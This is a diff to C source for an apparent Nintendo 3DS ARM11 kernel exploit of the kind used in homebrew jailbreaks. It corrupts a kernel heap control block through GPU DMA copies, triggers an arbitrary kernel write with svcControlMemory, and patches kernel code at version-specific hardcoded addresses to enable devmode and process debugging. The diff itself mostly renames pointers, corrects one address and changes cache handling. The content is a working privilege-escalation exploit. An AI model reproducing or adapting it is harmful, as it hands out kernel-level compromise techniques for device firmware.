@@ -5,22 +5,23 @@
 #include <malloc.h>
 #include <dirent.h>
 
+
+//Uncomment to have progress printed w/ printf
+#define DEBUG_PROCESS
+#define wait() svcSleepThread(1000000000ull)
+
+
 u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
 unsigned int patch_addr;
 unsigned int svc_patch_addr;
 unsigned char patched_svc = 0;
 unsigned int kversion;
-u32 *KProcessPtr;
-u8* devModePtr;
-u32 offs_exheader_flags;
+u32 **ppKProcess;
+u32 *pDevmode;
+u8 *offs_exheader_flags;
 u8 isN3DS = 0;
 u32 *backup;
 unsigned int *arm11_buffer;
-
-//Uncomment to have progress printed w/ printf
-#define DEBUG_PROCESS
-
-#define wait() svcSleepThread(1000000000ull)
 
 int do_gshax_copy(void *dst, void *src, unsigned int len)
 {
@@ -61,14 +62,14 @@ int arm11_kernel_exploit_setup(void)
 	// get proper patch address for our kernel -- thanks yifanlu once again
 	kversion = *(unsigned int *)0x1FF80000; // KERNEL_VERSION register
 	
-	KProcessPtr = 0xFFFF9004;
+	ppKProcess = (u32 *)0xFFFF9004;
 	patch_addr = 0;
 	svc_patch_addr = 0;
 	APT_CheckNew3DS(NULL, &isN3DS);
 	
 	//TODO tested on two different kernel versions only
 	offs_exheader_flags = 0xA8;
-	devModePtr = (u8*)0xFFF2D00A;
+	pDevmode = 0xFFF2D00A;
 	
 	if(!isN3DS || kversion < 0x022C0600)
 	{
@@ -118,7 +119,7 @@ int arm11_kernel_exploit_setup(void)
 			patch_addr = 0xDFF8382F;
 			svc_patch_addr = 0xDFF82260;
 			offs_exheader_flags = 0xB0;
-			devModePtr = (u8*)0xFFF2E00A;
+			pDevmode = 0xFFF2E00A;
 		}
 		else
 		{
@@ -157,24 +158,24 @@ int arm11_kernel_exploit_setup(void)
 	arm11_buffer[2] = 0;
 	arm11_buffer[3] = 0;
 
+
 	// overwrite free pointer
 #ifdef DEBUG_PROCESS
 	printf("Overwriting free pointer %x\n", mem_hax_mem);
 	wait();
 #endif
 
-	//Trigger write to kernel
+	// corrupt heap ctrl structure
 	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u);
+	//Trigger write to kernel
 	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);
-
 
 	printf("Heap control block after corruption:\n");
 	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);
 
 	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
 			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
-			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]);
-
+			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]); 
 
 #ifdef DEBUG_PROCESS
 	printf("Triggered kernel write\n");
@@ -229,6 +230,7 @@ void test(void)
 	arm11_buffer[0] = 0xFAAFFAAF;
 }
 
+
 arm11_kernel_exec (void)
 {
 	u32 old_cpsr;
@@ -238,7 +240,7 @@ arm11_kernel_exec (void)
 	arm11_buffer[0] = 0xF00FF00F;
 
 	// fix CreateThread
-	if(isN3DS && (kversion == 0x022C0600 || kversion == 0x022E0000) && (patch_addr == 0xDFF83837))   
+	if(isN3DS && (kversion == 0x022C0600 || kversion == 0x022E0000) && (patch_addr == 0xDFF8382F))   
 	{
 		// seg001:FFF03830 BL sub_FFF07B44
 		*(int *)(patch_addr+1) = 0xEB0010C3;
@@ -259,17 +261,17 @@ arm11_kernel_exec (void)
 	}
 
 	// enable "devmode"
-	*(u8*)(devModePtr) |= 1;
+	*((u8 *)pDevmode) |= 0x1;
 
 	// enable debugging
-	u32 *kproc = *(u32 *)KProcessPtr;	
-	*(u32 *)(kproc+offs_exheader_flags) |= 0x2;
-
+	u32 kproc = *((u32 *)ppKProcess);	
+	*((u32 *)(kproc + ((u8 *)offs_exheader_flags))) |= 0x2;
+	
 	EnableInterrupts(old_cpsr);
-
+	
+	CleanEntireDataCache();
 	InvalidateEntireInstructionCache();
-	InvalidateEntireDataCache();
-
+	
 	return 0;
 }
 
